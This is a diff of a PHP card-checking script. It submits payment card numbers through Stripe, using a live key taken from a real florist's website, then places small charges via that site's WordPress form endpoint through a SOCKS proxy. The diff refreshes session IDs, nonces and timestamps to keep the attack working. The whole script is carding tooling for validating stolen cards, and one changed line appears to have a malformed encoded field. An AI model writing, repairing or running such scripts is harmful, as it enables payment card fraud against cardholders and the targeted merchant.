@@ -349,7 +349,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=bdeb15a6-0298-49de-8b4c-761ed9f5d890e369e5&sid=3bf85dea-1e6a-4238-b777-ad9f2151fafe4cfba3&pasted_fields=number&payment_user_agent=stripe.js%2F5a5928be1f%3B+stripe-js-v3%2F5a5928be1f%3B+card-element&referrer=https%3A%2F%2Fflowersofbethlehem.com.au&time_on_page=374969&key=pk_live_51KquVnKLV2rxHZxolIJm4hF89QKkVuTOxe8RhxZvdUmLtUUEliBg3Ow1lY3UgpJB4ShiGn8IblrZ7bYsom1U18NZ00TdHt6KGl');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=da0023d5-49ac-4f4e-985e-b64fba270f665432e7&muid=bdeb15a6-0298-49de-8b4c-761ed9f5d890e369e5&sid=3651a87b-536e-42d9-b0dc-2791665c1ec051b31a&pasted_fields=number&payment_user_agent=stripe.js%2F5a5928be1f%3B+stripe-js-v3%2F5a5928be1f%3B+card-element&referrer=https%3A%2F%2Fflowersofbethlehem.com.au&time_on_page=139976&key=pk_live_51KquVnKLV2rxHZxolIJm4hF89QKkVuTOxe8RhxZvdUmLtUUEliBg3Ow1lY3UgpJB4ShiGn8IblrZ7bYsom1U18NZ00TdHt6KGl');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
@@ -358,7 +358,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
-curl_setopt($ch, CURLOPT_URL, 'https://flowersofbethlehem.com.au/wp-admin/admin-ajax.php?t=1707022320526');
+curl_setopt($ch, CURLOPT_URL, 'https://flowersofbethlehem.com.au/wp-admin/admin-ajax.php?t=1707104820957');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -383,7 +383,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D6083%26_fluentform_5_fluentformnonce%3Da9ee744bbc%26_wp_http_referer%3D%252Fcentral-coast-florist%252F%26email%3D'.$email.'%26input_text%3D0817480671%26description_2%3DNY%26description%3DNY%26description_3%3DNY%26payment_input%255B%255D%3D4%2Binch%2B%25244.00%26payment_method%3Dstripe%26__stripe_payment_method_id%3D'.$id.'&action=fluentform_submit&form_id=5');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'data=__fluent_form_embded_post_id%3D6083%26_fluentform_5_fluentformnonce%3D8097c61180%26_wp_http_referer%3D%252Fcentral-coast-florist%252F%26email%3Dgloosmoke99%2540gmail.com%26input_text%3D0817480671%26description_2%3DNY%26description%3DNY%26description_3%3DNY%26payment_input_4%255B%255D%3DDelivery%2Bto%2Bour%2Bareas%2B%252410%26payment_method%3Dstripe%26__stripe_payment_method_id%3'.$id.'&action=fluentform_submit&form_id=5');
 
 
 $result2 = curl_exec($ch);
